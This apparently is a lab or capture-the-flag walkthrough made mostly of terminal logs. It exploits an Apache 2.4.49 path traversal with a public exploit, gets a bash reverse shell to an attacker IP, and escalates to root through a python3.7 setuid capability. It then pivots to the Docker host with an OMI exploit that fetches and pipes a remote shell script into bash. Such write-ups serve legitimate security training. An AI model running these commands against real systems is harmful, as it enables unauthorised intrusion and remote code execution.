
<img width="1880" height="406" alt="image" src="https://github.com/user-attachments/assets/92fdcc18-1609-4731-8edd-4911fdd56c3a" />




```
nmap -sCV -T4 10.49.132.58        
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-12 06:35 -0400
Stats: 0:00:05 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 19.55% done; ETC: 06:35 (0:00:16 remaining)
Nmap scan report for 10.49.132.58
Host is up (0.091s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e0:d1:88:76:2a:93:79:d3:91:04:6d:25:16:0e:56:d4 (RSA)
|   256 91:18:5c:2c:5e:f8:99:3c:9a:1f:04:24:30:0e:aa:9b (ECDSA)
|_  256 d1:63:2a:36:dd:94:cf:3c:57:3e:8a:e8:85:00:ca:f6 (ED25519)
80/tcp open  http    Apache httpd 2.4.49 ((Unix))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.49 (Unix)
|_http-title: Consult - Business Consultancy Agency Template | Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


```


<img width="1902" height="879" alt="image" src="https://github.com/user-attachments/assets/ff3c4c9d-ebad-48ac-b1d7-8d7cf12ce91e" />




<img width="1602" height="964" alt="image" src="https://github.com/user-attachments/assets/1de298cc-30cc-41da-98d2-1f8c4f69e970" />



```
wget https://www.exploit-db.com/raw/50383
--2026-08-12 07:03:16--  https://www.exploit-db.com/raw/50383
Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.13
Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.13|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 737 [text/plain]
Saving to: ‘50383’

50383                                   100%[============================================================================>]     737  --.-KB/s    in 0s      

2026-08-12 07:03:17 (10.0 MB/s) - ‘50383’ saved [737/737]


```


<img width="1156" height="377" alt="image" src="https://github.com/user-attachments/assets/ebad891e-e95e-430e-8db6-f44166a19323" />



```
./exploit.sh targets.txt /bin/sh "bash -c 'bash -i >& /dev/tcp/192.168.128.61/4444 0>&1'" 
./exploit.sh: 12: [[: not found
./exploit.sh: 12: [[: not found
10.49.132.58

```

```
nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.128.61] from (UNKNOWN) [10.49.132.58] 33986
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
daemon@4a70924bafa0:/bin$ python3 -c "import pty;pty.spawn('/bin/bash')"
python3 -c "import pty;pty.spawn('/bin/bash')"
daemon@4a70924bafa0:/bin$ python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
< -c 'import os; os.setuid(0); os.system("/bin/sh")'
bash: python3.8: command not found
daemon@4a70924bafa0:/bin$ id
id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
daemon@4a70924bafa0:/bin$ getcap -r / 2>/dev/null
getcap -r / 2>/dev/null
/usr/bin/python3.7 = cap_setuid+ep
daemon@4a70924bafa0:/bin$ python3.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'    
< -c 'import os; os.setuid(0); os.system("/bin/sh")'
# pwd
pwd
/bin
# python3 -c "import pty;pty.spawn('/bin/bash')"
python3 -c "import pty;pty.spawn('/bin/bash')"
root@4a70924bafa0:/bin# cd ../../../
cd ../../../
root@4a70924bafa0:/# cd /tmp
cd /tmp

```

<img width="1874" height="435" alt="image" src="https://github.com/user-attachments/assets/273a4a2b-cf20-487f-b1ac-f42cd15343fc" />



<img width="1102" height="273" alt="image" src="https://github.com/user-attachments/assets/44201e01-ac04-40a7-8e99-eafdc505a8da" />




```
root@4a70924bafa0:/# cd /tmp
cd /tmp
root@4a70924bafa0:/tmp# ls
ls
nmap
root@4a70924bafa0:/tmp# ifconfig      
ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:ac:11:00:02  txqueuelen 0  (Ethernet)
        RX packets 9363  bytes 7048842 (6.7 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 200522  bytes 18871933 (17.9 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 519924  bytes 21837233 (20.8 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 519924  bytes 21837233 (20.8 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@4a70924bafa0:/tmp# ./nmap -sn 172.17.0.0/24
./nmap -sn 172.17.0.0/24

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2026-08-12 12:05 UTC
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for ip-172-17-0-1.ap-south-1.compute.internal (172.17.0.1)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.000035s latency).
MAC Address: 02:42:F7:16:10:45 (Unknown)
Nmap scan report for 4a70924bafa0 (172.17.0.2)
Host is up.
Nmap done: 256 IP addresses (2 hosts up) scanned in 3.72 seconds
root@4a70924bafa0:/tmp# ./nmap_ 172.17.0.1 -p- --min-rate 5000
./nmap_ 172.17.0.1 -p- --min-rate 5000
bash: ./nmap_: No such file or directory
root@4a70924bafa0:/tmp# ./nmap 172.17.0.1 -p- --min-rate 5000
./nmap 172.17.0.1 -p- --min-rate 5000

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2026-08-12 12:07 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for ip-172-17-0-1.ap-south-1.compute.internal (172.17.0.1)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.000047s latency).
Not shown: 65531 filtered ports
PORT     STATE  SERVICE
22/tcp   open   ssh
80/tcp   open   http
5985/tcp closed unknown
5986/tcp open   unknown
MAC Address: 02:42:F7:16:10:45 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 39.90 seconds

```


<img width="1731" height="462" alt="image" src="https://github.com/user-attachments/assets/03110f76-daae-4d11-b003-a081479fa69a" />



```
root@4a70924bafa0:/tmp# curl -O http://192.168.128.61:80/omi.py 
curl -O http://192.168.128.61:80/omi.py 
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2720  100  2720    0     0  16585      0 --:--:-- --:--:-- --:--:-- 16585
root@4a70924bafa0:/tmp# ls
ls
nmap  omi.py
root@4a70924bafa0:/tmp# python3 omi.py -t 172.17.0.1 -c "curl http://192.168.128.61:80/shell.sh  | bash"
<-c "curl http://192.168.128.61:80/shell.sh  | bash"


```




<img width="1083" height="430" alt="image" src="https://github.com/user-attachments/assets/6bce5a44-d0bf-4cf3-bb5e-483c61a81ab6" />



<img width="656" height="420" alt="image" src="https://github.com/user-attachments/assets/9f77b2da-0437-4486-9a3e-c41f2f83a0b4" />


